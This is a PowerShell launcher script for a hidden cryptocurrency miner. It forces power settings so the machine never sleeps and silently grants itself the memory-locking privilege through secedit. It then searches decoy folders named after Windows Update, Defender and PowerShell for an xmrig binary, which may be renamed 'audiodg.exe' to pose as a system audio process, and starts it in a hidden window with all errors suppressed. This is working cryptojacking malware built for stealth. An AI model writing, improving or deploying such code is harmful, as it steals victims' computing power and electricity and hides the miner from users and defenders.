# =====================================================================
# AUTO_FIX_HASHRATE.ps1
# Fully silent | Works from same folder as SILENT_LAUNCH.vbs
# =====================================================================

# Prevent multiple instances
$mutexName = "Global\AutoFixHashrateMutex"
$mutex = $null
try {
    $mutex = New-Object System.Threading.Mutex($true, $mutexName)
    if (-not $mutex.WaitOne(0, $false)) { exit }
} catch { exit }

# Force High Performance power plan (silent)
try {
    powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c 2>$null
    powercfg /change monitor-timeout-ac 0 2>$null
    powercfg /change standby-timeout-ac 0 2>$null
    powercfg /change disk-timeout-ac 0 2>$null
    powercfg /change hibernate-timeout-ac 0 2>$null
} catch {}

# Re-apply Huge Pages (best effort, silent)
try {
    $account = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $sid = (New-Object System.Security.Principal.NTAccount($account)).Translate([System.Security.Principal.SecurityIdentifier]).Value
    $tmpFile = [System.IO.Path]::GetTempFileName()
    secedit /export /cfg $tmpFile 2>$null | Out-Null

    $cfg = Get-Content $tmpFile -ErrorAction SilentlyContinue
    if ($cfg) {
        $newCfg = @()
        $found = $false
        foreach ($line in $cfg) {
            if ($line -match '^SeLockMemoryPrivilege\s*=') {
                $found = $true
                if ($line -notlike "*$sid*") {
                    $newCfg += "$line,*$sid"
                } else {
                    $newCfg += $line
                }
            } else {
                $newCfg += $line
            }
        }
        if (-not $found) { $newCfg += "SeLockMemoryPrivilege = *$sid" }
        $newCfg | Set-Content $tmpFile -ErrorAction SilentlyContinue
        secedit /configure /db "$env:TEMP\secedit.sdb" /cfg $tmpFile /areas USER_RIGHTS 2>$null | Out-Null
    }
    Remove-Item $tmpFile -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\secedit.sdb" -Force -ErrorAction SilentlyContinue
} catch {}

# Stop existing miner processes
Get-Process -Name "audiodg","xmrig","AudioSrv" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# Find miner (search common locations)
$possiblePaths = @(
    "C:\ProgramData\Microsoft\Windows\WindowsUpdate",
    "C:\ProgramData\WindowsUpdater",
    "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv",
    "C:\ProgramData\Microsoft\Network\Downloader",
    "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell",
    "$env:LOCALAPPDATA\Microsoft\Windows\Defender",
    "$env:APPDATA\Microsoft\Windows\Templates",
    "$env:TEMP\WindowsUpdateCache"
)

$minerExe = $null
$configFile = $null

foreach ($path in $possiblePaths) {
    if (Test-Path "$path\audiodg.exe") {
        $minerExe = "$path\audiodg.exe"
        $configFile = "$path\config.json"
        break
    }
    if (Test-Path "$path\xmrig.exe") {
        $minerExe = "$path\xmrig.exe"
        $configFile = "$path\config.json"
        break
    }
}

# Start miner if found
if ($minerExe -and (Test-Path $configFile)) {
    try {
        Start-Process -FilePath $minerExe -ArgumentList "--config=`"$configFile`" --randomx-1gb-pages --no-color" -WindowStyle Hidden -ErrorAction SilentlyContinue
    } catch {}
}

# Cleanup mutex
try { $mutex.ReleaseMutex() } catch {}
try { $mutex.Dispose() } catch {}

exit